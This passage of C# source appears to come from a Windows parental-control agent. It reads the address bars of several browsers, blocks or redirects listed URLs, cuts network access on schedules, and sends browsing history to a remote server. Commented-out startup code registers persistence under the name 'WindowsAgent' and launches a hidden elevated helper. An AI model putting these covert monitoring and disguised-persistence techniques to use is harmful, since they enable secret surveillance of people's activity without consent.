                if (Connection.ConnectionIsAlive == true)
                {
                    Connection.SendDataSM.WaitOne();
                    Packet.MainPacket MPacket = new Packet.MainPacket();
                    MPacket.PPacket = ProPackData;
                    MPacket.Data = Data;

                    Connection.SendToServer(Pack.ToString(MPacket));
                    //Connection.SendToServer(Data);
                    Connection.SendDataSM.Release();
                }
                else
                {
                    DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                    RRow["ProPack"] = ProPackData;
                    RRow["Data"] = Data;
                    MeesageAdd.WaitOne();
                    RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                }
            }
            catch (Exception E)
            {
                InternetConnection = false;
                NetWork2Timer.Clear();
                try
                {
                    foreach (MyTimer3 var in Network3Timer)
                    {
                        //DataBaseAgent.SelectData("NetworkLimit", ref DS, "*", "NetworkLimitAct", ID, "ID");
                        //NetWork.Disable(DS.Tables["NetworkLimit"].Rows[0]["Name"].ToString());
                        var.STW.Stop();
                        DS.Tables["NetworkLimit"].Rows.Find(var.ID)["Remaining"] = var.Duration.Interval - var.STW.Elapsed.TotalMinutes;

                    }
                    Network3Timer.Clear();
                    Packet Pack = new Packet();
                    Packet.ProPacket ProConnection = new Packet.ProPacket();
                    Packet.NetworkStatus ConnectionPack = new Packet.NetworkStatus();
                    DataRow ConnectionRow = DS.Tables["MessageLog"].NewRow();
                    ConnectionPack.Data = NetWork.GetConnectionInterfaceName();
                    ConnectionPack.Time = DateTime.Now;
                    ConnectionPack.Type = (short)Packet.NetworkStatusType.NoInternet;
                    string Data = Pack.ToString(ConnectionPack);
                    ProConnection.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                    ProConnection.Type = (short)Packet.PacketType.NetworkStatusNow;
                    ProConnection.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                    string ProPackData = Pack.ToString(ProConnection);
                    if (Connection.ConnectionIsAlive == true)
                    {
                        Connection.SendDataSM.WaitOne();
                        Packet.MainPacket MPacket = new Packet.MainPacket();
                        MPacket.PPacket = ProPackData;
                        MPacket.Data = Data;

                        Connection.SendToServer(Pack.ToString(MPacket));
                        //Connection.SendToServer(Data);
                        Connection.SendDataSM.Release();
                    }
                    else
                    {
                        DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                        RRow["ProPack"] = ProPackData;
                        RRow["Data"] = Data;
                        MeesageAdd.WaitOne();
                        RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                        Thread.Sleep(10);
                        DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                        MeesageAdd.Release();
                        DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                    }
                }

                catch (Exception EE)
                {

                }


            }
            try
            {
                foreach (DataRow var in DS.Tables["NetworkLimit"].Rows)
                {
                    DateTime TempDate = Convert.ToDateTime(var["StartTime"].ToString());
                    DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
                    TempDate = Convert.ToDateTime(var["EndTime"].ToString());
                    DateTime End = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
                    if (DateTime.Now.CompareTo(Start) >= 0 && (DateTime.Now.CompareTo(End) <= 0))
                    {
                        switch ((short)var["Act"])
                        {
                            case (short)Packet.NetworkCommandsType.Disable:
                                {
                                    //string Conn = NetWork.GetConnectionInterfaceName();
                                    NetWork.Disable(var["Name"].ToString());
                                }; break;
                        }

                        break;
                    }
                    else
                    {
                        if (DateTime.Now.CompareTo(Start) <= 0)
                        {
                            try
                            {
                                MyTimer3 TimeWatcher = new MyTimer3();
                                System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                System.Timers.Timer Duration = new System.Timers.Timer(((TimeSpan)var["Duration"]).TotalMilliseconds);
                                Target.Elapsed += BeforNetworkLimitElipced;
                                Duration.Elapsed += Duration_NetworkElapsed;
                                Target.Start();
                                TimeWatcher.STW = new Stopwatch();
                                TimeWatcher.STW.Start();
                                TimeWatcher.TimeWatcher = Target;
                                TimeWatcher.ID = var["ID"].ToString();
                                TimeWatcher.Duration = Duration;
                                Network3Timer.Add(TimeWatcher);
                            }
                            catch (Exception e)
                            {
                                MyTimer TimeWatcher = new MyTimer();
                                System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                Target.Elapsed += BeforNetworkLimitElipced;
                                Target.Start();
                                TimeWatcher.TimeWatcher = Target;
                                TimeWatcher.ID = var["ID"].ToString();
                                NetWork2Timer.Add(TimeWatcher);
                            }

                        }
                    }
                    //using (var client = new WebClient())
                    //{
                    //    using (client.OpenRead("http://google.com/"))
                    //    {
                    //        InternetConnection = true;
                    //    }
                    //}
                }
            }
            catch (Exception E)
            {

            }

        }

        private void Duration_NetworkElapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer3 TargetInstance = Network3Timer.Find(x => x.TimeWatcher == Target);
                string ID = TargetInstance.ID;
                TargetInstance.STW.Stop();
                //if (DS.Tables.Contains("AppsLimit") == false)
                //{
                //    DataBaseAgent.SelectData("AppsLimit", ref DS, "*", "AppsTarget", ID, "ID");
                //}
                DS.Tables["NetworkLimit"].Rows.Find(ID)["Remaining"] = 0;
                //DS.Tables["NetworkLimit"].AcceptChanges();
                DataBaseAgent.InsertData(DS.Tables["NetworkLimit"]);
                //DS.Tables.Remove("SystemLimitTarget");
                Network3Timer.Remove(TargetInstance);
                NetWork.Disable(ConnectedToInternetInterface.Split(':')[1]);

            }
            catch (Exception EE)
            {

            }
        }

        struct MyTimer
        {
            public System.Timers.Timer TimeWatcher;
            public string ID;
        }

        struct MyTimer3
        {
            public System.Timers.Timer TimeWatcher;
            public System.Timers.Timer Duration;
            public string ID;
            public Stopwatch STW;
        }

        public void ChromeHandler(object src, AutomationEventArgs e)
        {
            AutomationElement Page = src as AutomationElement;// Find Page that Send Event
            AutomationElement EditBox;
            EditBox = Page.FindAll(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"))[0];// find Edit box that 
            // Name is "Address and search bar"
            ValuePattern Value = (ValuePattern)EditBox.GetCurrentPattern(ValuePattern.Pattern);// Get String that have Url In this.
            string URL = Value.Current.Value;
            Task.Run(() =>
            {

                if (DS.Tables.Contains("BlockURLFind") != true)
                {
                    DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURLFind");
                }
                foreach (DataRow var in DS.Tables["BlockURLFind"].Rows)
                {
                    string D = var["URL"].ToString();
                    if (var["URL"].ToString().Contains(URL) == true)
                    {
                        if ((short)var["Act"] == 2)
                        {
                            Redirect(EditBox, var["Redirect"].ToString());
                        }
                        else
                        {
                            DialogResult Result = MessageBox.Show("You Can not Access to This Content By Parent", "Parent Message", MessageBoxButtons.OK);
                            Redirect(EditBox, var["Redirect"].ToString());
                        }
                    }
                }
                DS.Tables.Remove("BlockURLFind");
            });
            Packet Pack = new Packet();
            DataRow URLRow = DS.Tables["MessageLog"].NewRow();
            Packet.URL URLPack = new Packet.URL();
            Packet.ProPacket ProURL = new Packet.ProPacket();
            string Data = Pack.ToString(URLPack);
            ProURL.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
            ProURL.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
            ProURL.Type = (short)Packet.URLType.History;
            URLRow["Data"] = Data;


            URLRow["Send"] = 0;
            MeesageAdd.WaitOne();
            URLRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
            Thread.Sleep(10);
            //URLRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
            DS.Tables["MessageLog"].Rows.Add(URLRow);
            MeesageAdd.Release();
            DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
            string ProPackData = Pack.ToString(ProURL);
            if (Connection.ConnectionIsAlive == true)
            {
                Connection.SendDataSM.WaitOne();
                Packet.MainPacket MPacket = new Packet.MainPacket();
                MPacket.PPacket = ProPackData;
                MPacket.Data = Data;

                Connection.SendToServer(Pack.ToString(MPacket));
                //Connection.SendToServer(Data);
                Connection.SendDataSM.Release();
            }
            else
            {
                DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                RRow["ProPack"] = ProPackData;
                RRow["Data"] = Data;
                MeesageAdd.WaitOne();
                RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                Thread.Sleep(10);
                DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                MeesageAdd.Release();
                DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
            }
        }

        public void firefoxHandler(object src, AutomationEventArgs e)
        {
            AutomationElement Page = src as AutomationElement;// Find Page that Send Event
            AutomationElement EditBox;
            EditBox = Page.FindAll(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Search or enter address"))[0];// find Edit box that 
            // Name is "Search or enter address"
            ValuePattern Value = (ValuePattern)EditBox.GetCurrentPattern(ValuePattern.Pattern);// Get String that have Url In this.
            string URL = Value.Current.Value;
            DataRow Row = DS.Tables["URLs"].NewRow();
            Task.Run(() =>
            {
                if (DS.Tables.Contains("BlockURLFind") != true)
                {
                    DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURLFind");
                }
                foreach (DataRow var in DS.Tables["BlockURLFind"].Rows)
                {
                    if (var["URL"].ToString().Contains(URL) == true)
                    {
                        if ((short)var["Act"] == 2)
                        {
                            Redirect(EditBox, var["Redirect"].ToString());
                        }
                        else
                        {
                            DialogResult Result = MessageBox.Show("You Can not Access to This Content By Parent", "Parent Message", MessageBoxButtons.OK);
                            Redirect(EditBox, var["Redirect"].ToString());
                        }
                    }
                }
                DS.Tables.Remove("BlockURLFind");
            });
            Packet Pack = new Packet();
            DataRow URLRow = DS.Tables["MessageLog"].NewRow();
            Packet.URL URLPack = new Packet.URL();
            Packet.ProPacket ProURL = new Packet.ProPacket();
            string Data = Pack.ToString(URLPack);
            ProURL.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
            ProURL.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
            ProURL.Type = (short)Packet.URLType.History;
            URLRow["Data"] = Data;


            URLRow["Send"] = 0;
            MeesageAdd.WaitOne();
            URLRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
            Thread.Sleep(10);
            //URLRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
            DS.Tables["MessageLog"].Rows.Add(URLRow);
            MeesageAdd.Release();
            DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
            string ProPackData = Pack.ToString(ProURL);
            if (Connection.ConnectionIsAlive == true)
            {
                Connection.SendDataSM.WaitOne();
                Packet.MainPacket MPacket = new Packet.MainPacket();
                MPacket.PPacket = ProPackData;
                MPacket.Data = Data;

                Connection.SendToServer(Pack.ToString(MPacket));
                //Connection.SendToServer(Data);
                Connection.SendDataSM.Release();
            }
            else
            {
                DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                RRow["ProPack"] = ProPackData;
                RRow["Data"] = Data;
                MeesageAdd.WaitOne();
                RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                Thread.Sleep(10);
                DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                MeesageAdd.Release();
                DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
            }
        }

        public void IEHandler(object src, AutomationEventArgs e)
        {
            AutomationElement Page = src as AutomationElement;// Find Page that Send Event
            AutomationElement EditBox;
            EditBox = Page.FindAll(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search using Bing"))[0];// find Edit box that 
            // Name is "Address and search using Bing"
            ValuePattern Value = (ValuePattern)EditBox.GetCurrentPattern(ValuePattern.Pattern);// Get String that have Url In this.
            string URL = Value.Current.Value;
            Task.Run(() =>
            {
                if (DS.Tables.Contains("BlockURLFind") != true)
                {
                    DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURLFind");
                }
                foreach (DataRow var in DS.Tables["BlockURLFind"].Rows)
                {
                    if (var["URL"].ToString().Contains(URL) == true)
                    {
                        if ((short)var["Act"] == 2)
                        {
                            Redirect(EditBox, var["Redirect"].ToString());
                        }
                        else
                        {
                            DialogResult Result = MessageBox.Show("You Can not Access to This Content By Parent", "Parent Message", MessageBoxButtons.OK);
                            Redirect(EditBox, var["Redirect"].ToString());
                        }
                    }
                }
                DS.Tables.Remove("BlockURLFind");
            });
            Packet Pack = new Packet();
            DataRow URLRow = DS.Tables["MessageLog"].NewRow();
            Packet.URL URLPack = new Packet.URL();
            Packet.ProPacket ProURL = new Packet.ProPacket();
            string Data = Pack.ToString(URLPack);
            ProURL.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
            ProURL.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
            ProURL.Type = (short)Packet.URLType.History;
            URLRow["Data"] = Data;


            URLRow["Send"] = 0;
            MeesageAdd.WaitOne();
            URLRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
            Thread.Sleep(10);

            //URLRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
            DS.Tables["MessageLog"].Rows.Add(URLRow);
            MeesageAdd.Release();
            DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
            string ProPackData = Pack.ToString(ProURL);
            if (Connection.ConnectionIsAlive == true)
            {
                Connection.SendDataSM.WaitOne();
                Packet.MainPacket MPacket = new Packet.MainPacket();
                MPacket.PPacket = ProPackData;
                MPacket.Data = Data;

                Connection.SendToServer(Pack.ToString(MPacket));
                //Connection.SendToServer(Data);
                Connection.SendDataSM.Release();
            }
            else
            {
                DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                RRow["ProPack"] = ProPackData;
                RRow["Data"] = Data;
                MeesageAdd.WaitOne();
                RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                Thread.Sleep(10);
                DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                MeesageAdd.Release();
                DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
            }
        }

        public void OperaHandler(object src, AutomationEventArgs e)
        {
            AutomationElement Page = src as AutomationElement;// Find Page that Send Event
            AutomationElement EditBox;
            EditBox = Page.FindAll(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address field"))[0];// find Edit box that 
            // Name is "Address field"
            ValuePattern Value = (ValuePattern)EditBox.GetCurrentPattern(ValuePattern.Pattern);// Get String that have Url In this.
            string URL = Value.Current.Value;
            Task.Run(() =>
            {
                if (DS.Tables.Contains("BlockURLFind") != true)
                {
                    DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURLFind");
                }
                foreach (DataRow var in DS.Tables["BlockURLFind"].Rows)
                {
                    if (var["URL"].ToString().Contains(URL) == true)
                    {
                        if ((short)var["Act"] == 2)
                        {
                            Redirect(EditBox, var["Redirect"].ToString());
                        }
                        else
                        {
                            DialogResult Result = MessageBox.Show("You Can not Access to This Content By Parent", "Parent Message", MessageBoxButtons.OK);
                            Redirect(EditBox, var["Redirect"].ToString());
                        }
                    }
                }
                DS.Tables.Remove("BlockURLFind");
            });
            Packet Pack = new Packet();
            DataRow URLRow = DS.Tables["MessageLog"].NewRow();
            Packet.URL URLPack = new Packet.URL();
            Packet.ProPacket ProURL = new Packet.ProPacket();
            string Data = Pack.ToString(URLPack);
            ProURL.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
            ProURL.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
            ProURL.Type = (short)Packet.URLType.History;
            URLRow["Data"] = Data;


            URLRow["Send"] = 0;
            MeesageAdd.WaitOne();
            URLRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
            Thread.Sleep(10);
            //URLRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
            DS.Tables["MessageLog"].Rows.Add(URLRow);
            MeesageAdd.Release();
            DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
            string ProPackData = Pack.ToString(ProURL);
            if (Connection.ConnectionIsAlive == true)
            {
                Connection.SendDataSM.WaitOne();
                Packet.MainPacket MPacket = new Packet.MainPacket();
                MPacket.PPacket = ProPackData;
                MPacket.Data = Data;

                Connection.SendToServer(Pack.ToString(MPacket));
                //Connection.SendToServer(Data);
                Connection.SendDataSM.Release();
            }
            else
            {
                DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                RRow["ProPack"] = ProPackData;
                RRow["Data"] = Data;
                MeesageAdd.WaitOne();
                RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                Thread.Sleep(10);
                DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                MeesageAdd.Release();
                DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
            }
        }

        public void EdgeHandler(object src, AutomationEventArgs e)
        {
            try
            {
                AutomationElement Page = src as AutomationElement;// Find Page that Send Event
                AutomationElement EditBox;
                EditBox = Page.FindAll(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Search or enter web address"))[0];// find Edit box that 
                                                                                                                                                       //automationId = addressEditBox
                                                                                                                                                       // Class = =RichEditBox
                                                                                                                                                       // Name is "Search or enter web address"
                                                                                                                                                       //ValuePattern Value = (ValuePattern)EditBox.GetCurrentPattern(ValuePattern.Pattern);// Get String that have Url In this.
                                                                                                                                                       //string URL = Value.Current.Value;
                ValuePattern Value = (ValuePattern)EditBox.GetCurrentPattern(ValuePattern.Pattern);
                string URL = Value.Current.Value;
                Task.Run(() =>
                {
                    if (DS.Tables.Contains("BlockURL") != true)
                    {
                        DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURL");
                    }

                    foreach (DataRow var in DS.Tables["BlockURL"].Rows)
                    {
                        if ((var["URL"].ToString().Contains(URL) == true) || (URL.Contains(var["URL"].ToString()) == true))
                        {
                            if ((short)var["Act"] == 2)
                            {
                                Redirect(EditBox, var["Redirect"].ToString());
                            }
                            else
                            {
                                DialogResult Result = MessageBox.Show("You Can not Access to This Content By Parent", "Parent Message", MessageBoxButtons.OK);
                                Redirect(EditBox, var["Redirect"].ToString());
                            }

                        }
                    }
                    DS.Tables.Remove("BlockURL");
                });
                Packet Pack = new Packet();
                DataRow URLRow = DS.Tables["MessageLog"].NewRow();
                Packet.URL URLPack = new Packet.URL();
                Packet.ProPacket ProURL = new Packet.ProPacket();
                if ((URL == "") && (Page.Current.Name.Contains("New Tab")))
                {
                    URLPack.Address = Page.Current.Name;
                    URLPack.Time = DateTime.Now;
                    URLPack.Browser = "Edge";

                }
                else
                {
                    URLPack.Address = URL;
                    URLPack.Time = DateTime.Now;
                    URLPack.Browser = "Edge";

                }
                string Data = Pack.ToString(URLPack);
                ProURL.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                ProURL.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                ProURL.Type = (short)Packet.PacketType.URL;
                URLRow["Data"] = Data;
                URLRow["Send"] = 0;
                MeesageAdd.WaitOne();
                //URLRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
                URLRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                Thread.Sleep(10);
                DS.Tables["MessageLog"].Rows.Add(URLRow);
                MeesageAdd.Release();
                DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
                string ProPackData = Pack.ToString(ProURL);
                if (Connection.ConnectionIsAlive == true)
                {
                    Connection.SendDataSM.WaitOne();
                    Packet.MainPacket MPacket = new Packet.MainPacket();
                    MPacket.PPacket = ProPackData;
                    MPacket.Data = Data;

                    Connection.SendToServer(Pack.ToString(MPacket));
                    //Connection.SendToServer(Data);
                    Connection.SendDataSM.Release();
                }
                else
                {
                    DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                    RRow["ProPack"] = ProPackData;
                    RRow["Data"] = Data;
                    MeesageAdd.WaitOne();
                    RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                }

            }
            catch (Exception E)
            {

            }

        }

        public void Redirect(AutomationElement element, string value)
        {
            try
            {
                // Validate arguments / initial setup
                //if (value == null)
                //    throw new ArgumentNullException(
                //        "String parameter must not be null.");
                //
                //if (element == null)
                //    throw new ArgumentNullException(
                //        "AutomationElement parameter must not be null");
                //
                // A series of basic checks prior to attempting an insertion.
                //
                // Check #1: Is control enabled?
                // An alternative to testing for static or read-only controls 
                // is to filter using 
                // PropertyCondition(AutomationElement.IsEnabledProperty, true) 
                // and exclude all read-only text controls from the collection.
                //if (!element.Current.IsEnabled)
                //{
                //    throw new InvalidOperationException(
                //        "The control with an AutomationID of "
                //        + element.Current.AutomationId.ToString()
                //        + " is not enabled.\n\n");
                //}

                // Check #2: Are there styles that prohibit us 
                //           from sending text to this control?
                //if (!element.Current.IsKeyboardFocusable)
                //{
                //    throw new InvalidOperationException(
                //        "The control with an AutomationID of "
                //        + element.Current.AutomationId.ToString()
                //        + "is read-only.\n\n");
                //}


                // Once you have an instance of an AutomationElement,  
                // check if it supports the ValuePattern pattern.
                object valuePattern = null;

                // Control does not support the ValuePattern pattern 
                // so use keyboard input to insert content.
                //
                // NOTE: Elements that support TextPattern 
                //       do not support ValuePattern and TextPattern
                //       does not support setting the text of 
                //       multi-line edit or document controls.
                //       For this reason, text input must be simulated
                //       using one of the following methods.
                //       
                if (!element.TryGetCurrentPattern(
                    ValuePattern.Pattern, out valuePattern))
                {
                    //feedbackText.Append("The control with an AutomationID of ")
                    //    .Append(element.Current.AutomationId.ToString())
                    //    .Append(" does not support ValuePattern.")
                    //    .AppendLine(" Using keyboard input.\n");
                    //
                    // Set focus for input functionality and begin.
                    element.SetFocus();

                    // Pause before sending keyboard input.
                    //Thread.Sleep(100);

                    // Delete existing content in the control and insert new content.
                    SendKeys.SendWait("^{HOME}");   // Move to start of control
                    SendKeys.SendWait("^+{END}");   // Select everything
                    SendKeys.SendWait("{DEL}");     // Delete selection
                    //SendKeys.SendWait(value );
                    //SendKeys.SendWait("AAAAA");
                }
                // Control supports the ValuePattern pattern so we can 
                // use the SetValue method to insert content.
                else
                {
                    //feedbackText.Append("The control with an AutomationID of ")
                    //    .Append(element.Current.AutomationId.ToString())
                    //    .Append((" supports ValuePattern."))
                    //    .AppendLine(" Using ValuePattern.SetValue().\n");

                    // Set focus for input functionality and begin.
                    element.SetFocus();

                    ((ValuePattern)valuePattern).SetValue(value);
                    SendKeys.SendWait("{ENTER}");
                }
            }
            catch (ArgumentNullException exc)
            {
                //feedbackText.Append(exc.Message);
            }
            catch (InvalidOperationException exc)
            {
                //feedbackText.Append(exc.Message);
            }
            finally
            {
                //Feedback(feedbackText.ToString());
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //if (DS.Tables["Data"].Rows[5]["DataContent"].ToString() == "0")
            //{
            //    //DS.Tables["Data"].Rows[2]["DataContent"] = ChildIDTxt.Text;
            //    //DS.Tables["Data"].Rows[3]["DataContent"] = ParentIDTxt.Text;
            //    //Connection = new ConnectionClass(DS.Tables["Data"].Rows[1]["DataContent"].ToString(), "127.0.0.1", 1024 * 4, 3, MessageRecived);
            //}
            //else
            //{
            //    Sturtup = new ManagementEventWatcher();
            //    SturtupDisableOrEnable = new ManagementEventWatcher();
            //    NewDay = new System.Timers.Timer();
            //    MeesageAdd = new Semaphore(1, 1);
            //    RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //    Run = add;
            //    add.SetValue("WindowsAgent", Application.ExecutablePath.ToString());
            //    //add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //    //add.SetValue("WindowsAgentSpare", Application.StartupPath.ToString() + "\\" + "SpareWF.exe");
            //    //try
            //    //{
            //    //    string Data = add.GetValue("WindowsAgentSpare").ToString();
            //    //}
            //    //catch(Exception e)
            //    //{
            //    //    add.SetValue("WindowsAgentSpare",  Application.StartupPath.ToString() + "\\" + "SpareWF.exe" );
            //    //    ProcessStartInfo StartInfo = new ProcessStartInfo(Application.StartupPath.ToString() + "\\" + "SpareWF.exe");
            //    //    StartInfo.UseShellExecute = true;
            //    //    StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            //    //    StartInfo.Verb = "runas";
            //    //    Process process = new Process();
            //    //    process.StartInfo = StartInfo;
            //    //    process.Start();
            //    //}
            //    SetEventOnSturtup(SturtupChange);
            //    SetEventOnSturtupDiaableOrEnable(DisableOrEnableChange);
            //    SMUN = new Semaphore(1, 1);
            //    ProcessHandler = new Process_Handler();
            //    NetWork = new NetWorkTools();
            //    ScreenShot = new ScreenShotClass();
            //    MyPlace = new Location();
            //    AppTools = new ApplicationTools();
            //    BrowserDataController = new Browsers();
            //
            //    System2Timer = new List<MyTimer>();
            //    App2Timer = new List<MyTimer>();
            //    App3Timer = new List<MyTimer3>();
            //    System3Timer = new List<MyTimer3>();
            //    Network3Timer = new List<MyTimer3>();
            //    System3Timer = new List<MyTimer3>();
            //    NetWork2Timer = new List<MyTimer>();
            //    AllNetWorkAdaptors = new List<string>();
            //
            //
            //    DataBaseAgent.SelectData("RecivedCommands", ref DS, "RecivedCommands");
            //    DataBaseAgent.SelectData("MessageLogRemaining", ref DS, "MessageLogRemaining");
            //    DS.Tables["RecivedCommands"].RowChanged += MessageRecived;
            //    DataBaseAgent.SelectData("MessageLog", ref DS, "MessageLog");
            //    DS.Tables["MessageLog"].Clear();
            //    Task.Run(() =>
            //    {
            //
            //        DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimit");
            //        DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlock");
            //        DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURL");
            //        DataBaseAgent.SelectData("NetworkLimit", ref DS, "NetworkLimit");
            //        DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimit");
            //        //if (DS.Tables["AppLimit"].Rows.Count == 0)
            //        //{
            //        //    DS.Tables.Remove("AppLimit");
            //        //}
            //        //if (DS.Tables["AppsBlock"].Rows.Count == 0)
            //        //{
            //        //    DS.Tables.Remove("AppsBlock");
            //        //}
            //        //if (DS.Tables["BlockURL"].Rows.Count == 0)
            //        //{
            //        //    DS.Tables.Remove("BlockURL");
            //        //}
            //        //if (DS.Tables["NetworkLimit"].Rows.Count == 0)
            //        //{
            //        //    DS.Tables.Remove("NetworkLimit");
            //        //}
            //        //if (DS.Tables["SystemLimit"].Rows.Count == 0)
            //        //{
            //        //    DS.Tables.Remove("SystemLimit");
            //        //}
            //    });
            //    string T = DateTime.Now.ToString();
            //    NewDay.Interval = 2 * 3600 * 1000;//2h
            //    NewDay.Elapsed += NewDay_Elapsed;
            //    NewDay.Start();
            //
            //    Task.Run(() =>
            //    {
            //        try
            //        {
            //            DS.Tables["Data"].Rows[6]["DataContent"] = DateTime.Now.ToString();
            //            DataBaseAgent.UpdateData(DS.Tables["Data"]);
            //        }
            //        catch (Exception E)
            //        {
            //            DataRow Row = DS.Tables["Data"].NewRow();
            //            Row["DataContent"] = DateTime.Now.ToString();
            //            DS.Tables["Data"].Rows.Add(Row);
            //            DataBaseAgent.InsertData(DS.Tables["Data"]);
            //        }
            //        //Connection = new ConnectionClass(DS.Tables["Data"].Rows[1]["DataContent"].ToString(), "127.0.0.1", 1024 * 4, 3, MessageRecived);
            //    }
            //    );
            //
            //    Task.Run(() =>
            //    {
            //        DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimit");
            //        foreach (DataRow var in DS.Tables["SystemLimit"].Rows)
            //        {
            //            DateTime TempDate = Convert.ToDateTime(var["StartTime"]);
            //            DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
            //            TempDate = Convert.ToDateTime(var["EndTime"]);
            //            DateTime End = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
            //            if (DateTime.Now.CompareTo(Start) >= 0 && (DateTime.Now.CompareTo(End) <= 0))
            //            {
            //                switch ((short)var["Act"])
            //                {
            //                    case (short)Packet.SystemLimitAct.ShutDown:
            //                        {
            //                            DoSystem((short)var["Act"]);
            //                        }; break;
            //                    case (short)Packet.SystemLimitAct.ShoutDownWithError:
            //                        {
            //                            DialogResult Result = MessageBox.Show("Your Usage Time has Expire ", "Parent Message", MessageBoxButtons.OK);
            //                            if (Result == DialogResult.OK || Result != DialogResult.OK)
            //                            {
            //                                DoSystem((short)var["Act"]);
            //                            }
            //                            DoSystem((short)var["Act"]);
            //                        }; break;
            //                    case (short)Packet.SystemLimitAct.Sleep:
            //                        {
            //                            DoSystem((short)var["Act"]);
            //                        }; break;
            //                    case (short)Packet.SystemLimitAct.Reboot:
            //                        {
            //                            DoSystem((short)var["Act"]);
            //                        }; break;
            //                    case (short)Packet.SystemLimitAct.Logoff:
            //                        {
            //                            DoSystem((short)var["Act"]);
            //                        }; break;
